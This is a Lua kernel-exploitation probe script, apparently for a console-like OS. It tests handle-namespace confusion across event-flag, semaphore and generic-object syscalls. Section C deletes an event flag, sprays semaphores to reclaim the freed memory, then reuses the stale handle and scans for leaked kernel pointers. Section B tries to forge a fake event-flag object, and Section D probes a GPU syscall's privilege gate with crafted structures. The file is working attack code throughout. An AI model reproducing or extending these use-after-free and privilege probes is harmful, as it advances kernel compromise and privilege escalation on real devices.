-- CRASH_CLASS: MODERATE
-- PROBE 88a: Handle namespace confusion — event flags + semaphores + sys 557/558
--
-- Context: Decompiled handler analysis reveals that FIVE subsystems share
-- the same process+0xc48 handle namespace:
--   - Event flags (type 0x110): sys 538-546 (create/delete/open/close/wait/poll/signal/clear/cancel)
--   - Semaphores (type 0x120): sys 549-556 (create/delete/open/close/wait/try/post/cancel)
--   - Generic objects (type arg|0x1000): sys 557 creates 0x18-byte records
--   - Handle deletion (type arg|0x1000): sys 558 deletes by handle+type
--   - AIO subsystem: sys 662-670 also uses process+0xc48
--
-- NONE of these have credential/privilege checks in the decompiled entry.
-- Cross-subsystem handle manipulation + size mismatch = type confusion + UAF.
--
-- TEST_SECTION controls which section runs:
--   "A" = Event flag + semaphore reachability (LOW risk)
--   "B" = sys 557 generic object creation + sys 558 deletion (LOW risk)
--   "C" = Cross-subsystem handle confusion chain (MODERATE risk)
--   "D" = sys 648 GPU display OR-gate privilege probe (MODERATE risk)

local TEST_SECTION = "A"

print("=== PROBE 88a: HANDLE NAMESPACE CONFUSION ===")
print("Section: " .. TEST_SECTION)
print("")

-- Standard helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end
local function is_kptr(val)
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

-- ================================================================
-- SECTION A: Event flag + Semaphore reachability sweep
-- Tests sys 538-546 (event flags) and sys 549-556 (semaphores)
-- ================================================================
if TEST_SECTION == "A" then
    print("--- Section A: Event flag + Semaphore reachability ---")
    print("")

    -- Event flag syscalls: 538=create, 539=delete, 540=open, 541=close,
    --   542=wait, 543=poll, 544=signal, 545=clear, 546=cancel
    -- Semaphore syscalls: 549=create, 550=delete, 551=open, 552=close,
    --   553=wait, 554=try_wait(poll), 555=post(signal), 556=cancel

    -- Part 1: Create an event flag
    print("[A1] Creating event flag (sys 538)...")
    -- sys 538 takes: name ptr (0x20 bytes), attributes, init_pattern, output_handle_ptr
    local name_buf = memory.alloc(0x40)
    -- Write a name: "test_ef_001\0"
    local test_name = "test_ef_001"
    for i = 1, #test_name do
        pcall(function() memory.write_byte(name_buf + (i-1), string.byte(test_name, i)) end)
    end
    pcall(function() memory.write_byte(name_buf + #test_name, 0) end)

    local attr_buf = memory.alloc(0x20)
    safe_wd(attr_buf, 0x103)  -- attributes: shared naming (bit 0x100) + default
    local pattern_buf = memory.alloc(8)
    safe_wq(pattern_buf, uint64(0))  -- initial pattern = 0
    local handle_out = memory.alloc(8)
    safe_wq(handle_out, uint64(0))

    local sc538 = make_syscall(538)
    local ok538, ret538 = pcall(function()
        return sc538(uint64(name_buf), uint64(0x103), uint64(0), uint64(handle_out))
    end)
    print("  sys 538 (ef_create): ok=" .. tostring(ok538) .. " ret=" .. (ok538 and fmt(ret538) or "PCALL-FAIL"))

    local ef_handle = nil
    if ok538 then
        ef_handle = safe_rq(handle_out)
        print("  Event flag handle: " .. (ef_handle and fmt(ef_handle) or "nil"))
    end

    -- Part 2: Signal the event flag
    if ef_handle then
        print("")
        print("[A2] Signaling event flag (sys 544) with pattern 0xDEADBEEF...")
        local sc544 = make_syscall(544)
        local ok544, ret544 = pcall(function()
            return sc544(ef_handle, uint64(0xDEADBEEF))
        end)
        print("  sys 544 (ef_signal): ok=" .. tostring(ok544) .. " ret=" .. (ok544 and fmt(ret544) or "PCALL-FAIL"))
    end

    -- Part 3: Poll the event flag
    if ef_handle then
        print("")
        print("[A3] Polling event flag (sys 543)...")
        local poll_out = memory.alloc(8)
        safe_wq(poll_out, uint64(0))
        local sc543 = make_syscall(543)
        local ok543, ret543 = pcall(function()
            return sc543(ef_handle, uint64(0xFFFFFFFF), uint64(0), uint64(poll_out))
        end)
        print("  sys 543 (ef_poll): ok=" .. tostring(ok543) .. " ret=" .. (ok543 and fmt(ret543) or "PCALL-FAIL"))
        if ok543 then
            local poll_val = safe_rq(poll_out)
            print("  Polled pattern: " .. (poll_val and fmt(poll_val) or "nil"))
        end
    end

    -- Part 4: Create a semaphore
    print("")
    print("[A4] Creating semaphore (sys 549)...")
    local sem_name_buf = memory.alloc(0x40)
    local sem_name = "test_sem_001"
    for i = 1, #sem_name do
        pcall(function() memory.write_byte(sem_name_buf + (i-1), string.byte(sem_name, i)) end)
    end
    pcall(function() memory.write_byte(sem_name_buf + #sem_name, 0) end)

    local sem_handle_out = memory.alloc(8)
    safe_wq(sem_handle_out, uint64(0))

    -- sys 549: name, attributes(0x103=shared), initial_count(1), max_count(10), output
    local sc549 = make_syscall(549)
    local ok549, ret549 = pcall(function()
        return sc549(uint64(sem_name_buf), uint64(0x103), uint64(1), uint64(10))
    end)
    print("  sys 549 (sem_create): ok=" .. tostring(ok549) .. " ret=" .. (ok549 and fmt(ret549) or "PCALL-FAIL"))

    local sem_handle = nil
    if ok549 then
        -- Handle might be stored at td+0x408 (common return location)
        -- Or we need a separate output pointer
        -- Try reading handle_out
        sem_handle = safe_rq(sem_handle_out)
        print("  Semaphore handle (from output buf): " .. (sem_handle and fmt(sem_handle) or "nil"))
    end

    -- Part 5: Try-wait on semaphore (non-blocking)
    if sem_handle and to_num(sem_handle) ~= 0 then
        print("")
        print("[A5] Try-wait on semaphore (sys 554)...")
        local sc554 = make_syscall(554)
        local ok554, ret554 = pcall(function()
            return sc554(sem_handle)
        end)
        print("  sys 554 (sem_trywait): ok=" .. tostring(ok554) .. " ret=" .. (ok554 and fmt(ret554) or "PCALL-FAIL"))
    end

    -- Part 6: Post to semaphore
    if sem_handle and to_num(sem_handle) ~= 0 then
        print("")
        print("[A6] Post to semaphore (sys 555)...")
        local sc555 = make_syscall(555)
        local ok555, ret555 = pcall(function()
            return sc555(sem_handle, uint64(1))
        end)
        print("  sys 555 (sem_post): ok=" .. tostring(ok555) .. " ret=" .. (ok555 and fmt(ret555) or "PCALL-FAIL"))
    end

    -- Part 7: Delete the event flag
    if ef_handle then
        print("")
        print("[A7] Deleting event flag (sys 539)...")
        local sc539 = make_syscall(539)
        local ok539, ret539 = pcall(function()
            return sc539(ef_handle)
        end)
        print("  sys 539 (ef_delete): ok=" .. tostring(ok539) .. " ret=" .. (ok539 and fmt(ret539) or "PCALL-FAIL"))
    end

    -- Part 8: Delete the semaphore
    if sem_handle and to_num(sem_handle) ~= 0 then
        print("")
        print("[A8] Deleting semaphore (sys 550)...")
        local sc550 = make_syscall(550)
        local ok550, ret550 = pcall(function()
            return sc550(sem_handle)
        end)
        print("  sys 550 (sem_delete): ok=" .. tostring(ok550) .. " ret=" .. (ok550 and fmt(ret550) or "PCALL-FAIL"))
    end

    -- Part 9: Rapid event flag create/signal/delete cycle — watch for handle reuse
    print("")
    print("[A9] Handle reuse test: create+delete 8 event flags, track handles...")
    local handles_seen = {}
    for i = 1, 8 do
        local nb = memory.alloc(0x40)
        local nm = "ef_cycle_" .. i
        for j = 1, #nm do
            pcall(function() memory.write_byte(nb + (j-1), string.byte(nm, j)) end)
        end
        pcall(function() memory.write_byte(nb + #nm, 0) end)

        local ho = memory.alloc(8)
        safe_wq(ho, uint64(0))

        local ok_c, ret_c = pcall(function()
            return sc538(uint64(nb), uint64(0), uint64(0), uint64(ho))
        end)

        local h = nil
        if ok_c then
            h = safe_rq(ho)
            if h then
                handles_seen[#handles_seen + 1] = fmt(h)
                -- Delete immediately
                local ok_d, ret_d = pcall(function()
                    return make_syscall(539)(h)
                end)
                print("  cycle " .. i .. ": create=" .. fmt(ret_c) .. " handle=" .. fmt(h) .. " delete=" .. (ok_d and fmt(ret_d) or "FAIL"))
            else
                print("  cycle " .. i .. ": create=" .. fmt(ret_c) .. " handle=nil")
            end
        else
            print("  cycle " .. i .. ": create=PCALL-FAIL")
        end
    end

    print("")
    print("[A-DONE] Event flag + semaphore reachability complete")

-- ================================================================
-- SECTION B: sys 557 generic object creation + sys 558 deletion
-- ================================================================
elseif TEST_SECTION == "B" then
    print("--- Section B: sys 557/558 generic object create + delete ---")
    print("")

    -- sys 557: 3 args — name_ptr, 64-bit opaque value, type (low 16 bits | 0x1000)
    -- sys 558: 2 args — 32-bit handle ID, 16-bit type (| 0x1000)

    local sc557 = make_syscall(557)
    local sc558 = make_syscall(558)

    -- Part 1: Create generic objects with different types
    print("[B1] Creating generic objects via sys 557...")
    local types_to_test = {0x00, 0x01, 0x10, 0x20, 0x30, 0x40, 0xFF}
    local created_handles = {}

    for i, typ in ipairs(types_to_test) do
        local nb = memory.alloc(0x40)
        local nm = "gen_obj_" .. string.format("%02X", typ)
        for j = 1, #nm do
            pcall(function() memory.write_byte(nb + (j-1), string.byte(nm, j)) end)
        end
        pcall(function() memory.write_byte(nb + #nm, 0) end)

        -- Value = 0x4141414141414141 (marker for detection)
        local ok_c, ret_c = pcall(function()
            return sc557(uint64(nb), uint64(string.format("0x%X", 0x41414141 + i)), uint64(typ))
        end)
        local effective_type = string.format("0x%X", bit32.bor(typ, 0x1000))
        print("  type=0x" .. string.format("%02X", typ) .. " (effective " .. effective_type .. "): ok=" .. tostring(ok_c) .. " ret=" .. (ok_c and fmt(ret_c) or "PCALL-FAIL"))

        -- The handle is returned at td+0x408, which means ret IS the handle typically
        if ok_c then
            created_handles[#created_handles + 1] = {handle = ret_c, typ = typ}
        end
    end

    -- Part 2: Delete objects via sys 558
    print("")
    print("[B2] Deleting generic objects via sys 558...")
    for i, obj in ipairs(created_handles) do
        local h = to_num(obj.handle)
        if h ~= 0 then
            -- sys 558: handle_id (32-bit from handle), type (16-bit, | 0x1000 forced)
            local ok_d, ret_d = pcall(function()
                return sc558(uint64(h), uint64(obj.typ))
            end)
            print("  handle=" .. fmt(obj.handle) .. " type=0x" .. string.format("%02X", obj.typ) .. ": ok=" .. tostring(ok_d) .. " ret=" .. (ok_d and fmt(ret_d) or "PCALL-FAIL"))
        end
    end

    -- Part 3: Create + delete + recreate to test handle recycling
    print("")
    print("[B3] Handle recycling test (create-delete-create)...")
    for cycle = 1, 4 do
        local nb = memory.alloc(0x40)
        local nm = "recycle_" .. cycle
        for j = 1, #nm do
            pcall(function() memory.write_byte(nb + (j-1), string.byte(nm, j)) end)
        end
        pcall(function() memory.write_byte(nb + #nm, 0) end)

        local ok1, h1 = pcall(function() return sc557(uint64(nb), uint64(0xBBBBBBBB), uint64(0x50)) end)
        local h1_val = ok1 and fmt(h1) or "FAIL"

        if ok1 and to_num(h1) ~= 0 then
            local ok_del = pcall(function() return sc558(uint64(to_num(h1)), uint64(0x50)) end)
            -- Recreate with same name
            local ok2, h2 = pcall(function() return sc557(uint64(nb), uint64(0xCCCCCCCC), uint64(0x50)) end)
            local h2_val = ok2 and fmt(h2) or "FAIL"
            print("  cycle " .. cycle .. ": h1=" .. h1_val .. " -> delete -> h2=" .. h2_val .. " (same=" .. tostring(h1_val == h2_val) .. ")")
        else
            print("  cycle " .. cycle .. ": create failed: " .. h1_val)
        end
    end

    -- Part 4: Try accessing sys 557 object as event flag type (0x110)
    -- Create with type 0x110 (forced to 0x1110)
    print("")
    print("[B4] Creating generic object with event-flag-like type (0x110)...")
    local ef_name = memory.alloc(0x40)
    local efn = "fake_evflag"
    for j = 1, #efn do
        pcall(function() memory.write_byte(ef_name + (j-1), string.byte(efn, j)) end)
    end
    pcall(function() memory.write_byte(ef_name + #efn, 0) end)

    local ok_fake, ret_fake = pcall(function()
        return sc557(uint64(ef_name), uint64(0xDEADDEAD), uint64(0x110))
    end)
    print("  sys 557(type=0x110, effective=0x1110): ok=" .. tostring(ok_fake) .. " ret=" .. (ok_fake and fmt(ret_fake) or "PCALL-FAIL"))

    -- Now try to open it as a REAL event flag via sys 540 (open by name, type 0x110)
    if ok_fake then
        print("  Trying sys 540 (ef_open) with same name...")
        local sc540 = make_syscall(540)
        local ok_open, ret_open = pcall(function()
            return sc540(uint64(ef_name))
        end)
        print("  sys 540 (ef_open): ok=" .. tostring(ok_open) .. " ret=" .. (ok_open and fmt(ret_open) or "PCALL-FAIL"))
        -- If this returns a handle, we've achieved type confusion!
        -- The event flag operations will treat our 0x18-byte object as a full event flag struct
    end

    print("")
    print("[B-DONE] sys 557/558 generic object test complete")

-- ================================================================
-- SECTION C: Cross-subsystem handle confusion chain
-- Create event flag, get handle, delete via sys 558, reallocate, access stale
-- ================================================================
elseif TEST_SECTION == "C" then
    print("--- Section C: Cross-subsystem handle confusion ---")
    print("")

    local sc538 = make_syscall(538)  -- ef_create
    local sc539 = make_syscall(539)  -- ef_delete
    local sc543 = make_syscall(543)  -- ef_poll
    local sc544 = make_syscall(544)  -- ef_signal
    local sc549 = make_syscall(549)  -- sem_create
    local sc557 = make_syscall(557)  -- generic create
    local sc558 = make_syscall(558)  -- generic delete

    -- Step 1: Create an event flag, record its handle
    print("[C1] Creating event flag...")
    local ef_name = memory.alloc(0x40)
    local efn = "xsub_target"
    for j = 1, #efn do
        pcall(function() memory.write_byte(ef_name + (j-1), string.byte(efn, j)) end)
    end
    pcall(function() memory.write_byte(ef_name + #efn, 0) end)

    local ef_ho = memory.alloc(8)
    safe_wq(ef_ho, uint64(0))

    local ok1, ret1 = pcall(function()
        return sc538(uint64(ef_name), uint64(0), uint64(0xAAAAAAAA), uint64(ef_ho))
    end)
    local ef_handle = ok1 and safe_rq(ef_ho) or nil
    print("  ef_create: ok=" .. tostring(ok1) .. " ret=" .. (ok1 and fmt(ret1) or "FAIL"))
    print("  Handle: " .. (ef_handle and fmt(ef_handle) or "nil"))

    -- Step 2: Signal it to verify it works
    if ef_handle then
        print("")
        print("[C2] Verifying event flag works...")
        local ok_sig, ret_sig = pcall(function()
            return sc544(ef_handle, uint64(0x12345678))
        end)
        print("  ef_signal: ok=" .. tostring(ok_sig) .. " ret=" .. (ok_sig and fmt(ret_sig) or "FAIL"))

        local poll_out = memory.alloc(8)
        safe_wq(poll_out, uint64(0))
        local ok_poll, ret_poll = pcall(function()
            return sc543(ef_handle, uint64(0xFFFFFFFF), uint64(0), uint64(poll_out))
        end)
        local poll_val = safe_rq(poll_out)
        print("  ef_poll: ok=" .. tostring(ok_poll) .. " ret=" .. (ok_poll and fmt(ret_poll) or "FAIL") .. " pattern=" .. (poll_val and fmt(poll_val) or "nil"))
    end

    -- Step 3: Delete the event flag
    if ef_handle then
        print("")
        print("[C3] Deleting event flag via sys 539...")
        local ok_del, ret_del = pcall(function()
            return sc539(ef_handle)
        end)
        print("  ef_delete: ok=" .. tostring(ok_del) .. " ret=" .. (ok_del and fmt(ret_del) or "FAIL"))

        -- Step 4: Immediately allocate replacement objects to reclaim the freed memory
        print("")
        print("[C4] Spray: creating 16 semaphores to reclaim freed event flag memory...")
        local sem_handles = {}
        for i = 1, 16 do
            local sn = memory.alloc(0x40)
            local snm = "spray_sem_" .. string.format("%02d", i)
            for j = 1, #snm do
                pcall(function() memory.write_byte(sn + (j-1), string.byte(snm, j)) end)
            end
            pcall(function() memory.write_byte(sn + #snm, 0) end)

            local ok_s, ret_s = pcall(function()
                return sc549(uint64(sn), uint64(0x103), uint64(1), uint64(100))
            end)
            if ok_s then
                sem_handles[#sem_handles + 1] = ret_s
            end
            if i <= 4 or i == 16 then
                print("  sem[" .. i .. "] create: ok=" .. tostring(ok_s) .. " ret=" .. (ok_s and fmt(ret_s) or "FAIL"))
            end
        end

        -- Step 5: Try to signal the DELETED event flag handle
        -- If the handle slot was recycled, this operates on a different object
        print("")
        print("[C5] Attempting to signal DELETED event flag handle...")
        local ok_stale, ret_stale = pcall(function()
            return sc544(ef_handle, uint64(0xDEADBEEF))
        end)
        print("  ef_signal(stale): ok=" .. tostring(ok_stale) .. " ret=" .. (ok_stale and fmt(ret_stale) or "PCALL-FAIL"))
        -- If ret=0: the stale handle still resolved! Either handle wasn't invalidated,
        -- or a new object took its slot and we're writing to a semaphore structure

        -- Step 6: Try polling the stale handle
        print("")
        print("[C6] Polling stale event flag handle...")
        local stale_poll_out = memory.alloc(8)
        safe_wq(stale_poll_out, uint64(0))
        local ok_sp, ret_sp = pcall(function()
            return sc543(ef_handle, uint64(0xFFFFFFFF), uint64(0), uint64(stale_poll_out))
        end)
        local sp_val = safe_rq(stale_poll_out)
        print("  ef_poll(stale): ok=" .. tostring(ok_sp) .. " ret=" .. (ok_sp and fmt(ret_sp) or "PCALL-FAIL"))
        if sp_val then
            print("  Stale poll pattern: " .. fmt(sp_val))
            if is_kptr(sp_val) then
                print("  !!! KERNEL POINTER LEAKED via stale handle poll !!!")
            end
        end

        -- Scan stale poll output buffer for any kernel pointers
        print("")
        print("[C7] Scanning stale poll output for kernel pointers...")
        for off = 0, 0x38, 8 do
            local v = safe_rq(stale_poll_out + off)
            if v and is_kptr(v) then
                print("  !!! KPTR at +" .. string.format("0x%X", off) .. ": " .. fmt(v))
            end
        end

        -- Clean up sprayed semaphores
        print("")
        print("[C8] Cleaning up semaphores...")
        local sc550 = make_syscall(550)
        for i, sh in ipairs(sem_handles) do
            pcall(function() sc550(sh) end)
        end
    end

    print("")
    print("[C-DONE] Cross-subsystem confusion chain complete")

-- ================================================================
-- SECTION D: sys 648 GPU/Display Context Manager OR-gate probe
-- Tests whether any of the 4 privilege checks pass for our process
-- ================================================================
elseif TEST_SECTION == "D" then
    print("--- Section D: sys 648 GPU display OR-gate privilege probe ---")
    print("")

    -- sys 648 has narg=1: pointer to 0x178-byte (376-byte) user structure
    -- The main handler at 0x00A0 has FOUR sequential privilege checks (OR-based)
    -- If ANY of the four returns nonzero, we get access to the GPU display pipeline
    -- This includes: context creation, teardown, memory regions, display mode switching

    local sc648 = make_syscall(648)

    -- Part 1: Minimal reachability — null structure
    print("[D1] sys 648 with null pointer (baseline)...")
    local ok1, ret1 = pcall(function()
        return sc648(uint64(0))
    end)
    print("  sys 648(null): ok=" .. tostring(ok1) .. " ret=" .. (ok1 and fmt(ret1) or "PCALL-FAIL"))

    -- Part 2: Valid structure, zeroed
    print("")
    print("[D2] sys 648 with zeroed 0x178-byte structure...")
    local param = memory.alloc(0x200)
    for i = 0, 0x17F, 4 do safe_wd(param + i, 0) end

    local param_ptr = memory.alloc(8)
    safe_wq(param_ptr, uint64(param))

    local ok2, ret2 = pcall(function()
        return sc648(uint64(param_ptr))
    end)
    print("  sys 648(zeroed struct): ok=" .. tostring(ok2) .. " ret=" .. (ok2 and fmt(ret2) or "PCALL-FAIL"))
    -- Error analysis:
    -- ret=1 means ALL FOUR priv_checks failed (no GPU privilege at all)
    -- ret=0x16 (22) means we passed priv but failed version/type check
    -- ret=0 means success (we have GPU context access!)

    if ok2 then
        local rv = to_num(ret2)
        if rv == 1 then
            print("  RESULT: ALL 4 privilege checks FAILED — no GPU display access")
        elseif rv == 0x16 then
            print("  RESULT: PASSED privilege gate! Failed at version/type validation")
            print("  !!! WE HAVE GPU DISPLAY PIPELINE ACCESS !!!")
        elseif rv == 0 then
            print("  RESULT: FULL SUCCESS — GPU context created!")
            print("  !!! GPU DISPLAY PIPELINE IS OPEN !!!")
        else
            print("  RESULT: Error " .. string.format("0x%X", rv) .. " — need to decode")
        end
    end

    -- Part 3: Try with type code 0xf000 (display reset) and 0x20f00 (special)
    print("")
    print("[D3] sys 648 with type code 0xf000 (display reset)...")
    local param2 = memory.alloc(0x200)
    for i = 0, 0x17F, 4 do safe_wd(param2 + i, 0) end
    -- Type code at offset +0x50 within the structure (offset +0xb0 from stack base in handler)
    -- The copyin goes to [rbp-0x1a8], type check at [rbp-0x158] = struct+0x50
    safe_wd(param2 + 0x50, 0xF000)  -- type code
    -- Non-null callback/reference at struct+0xb0 ([rbp-0xf8])
    safe_wq(param2 + 0xB0, uint64(0x41414141))

    local param2_ptr = memory.alloc(8)
    safe_wq(param2_ptr, uint64(param2))

    local ok3, ret3 = pcall(function()
        return sc648(uint64(param2_ptr))
    end)
    print("  sys 648(type=0xf000): ok=" .. tostring(ok3) .. " ret=" .. (ok3 and fmt(ret3) or "PCALL-FAIL"))

    -- Part 4: Try entry gate (command 7 path at offset 0x0000)
    -- The entry gate at 0x0000 checks a single priv_check, and if it FAILS (returns 0),
    -- it checks if [r14] == 7 and sets a flag. Different from the main handler.
    print("")
    print("[D4] sys 648 with type code 0x20f00 (special)...")
    local param3 = memory.alloc(0x200)
    for i = 0, 0x17F, 4 do safe_wd(param3 + i, 0) end
    safe_wd(param3 + 0x50, 0x20F00)
    safe_wq(param3 + 0xB0, uint64(0x42424242))

    local param3_ptr = memory.alloc(8)
    safe_wq(param3_ptr, uint64(param3))

    local ok4, ret4 = pcall(function()
        return sc648(uint64(param3_ptr))
    end)
    print("  sys 648(type=0x20f00): ok=" .. tostring(ok4) .. " ret=" .. (ok4 and fmt(ret4) or "PCALL-FAIL"))

    -- Part 5: Scan for output data if any succeeded
    if ok2 and to_num(ret2) ~= 1 then
        print("")
        print("[D5] Scanning output structure for kernel pointers...")
        for off = 0, 0x17F, 8 do
            local v = safe_rq(param + off)
            if v and is_kptr(v) then
                print("  !!! KPTR at +0x" .. string.format("%X", off) .. ": " .. fmt(v))
            end
        end
    end

    print("")
    print("[D-DONE] sys 648 GPU display OR-gate probe complete")

else
    print("ERROR: Unknown TEST_SECTION: " .. tostring(TEST_SECTION))
    print("Valid sections: A, B, C, D")
end

print("")
print("=== PROBE 88a COMPLETE ===")
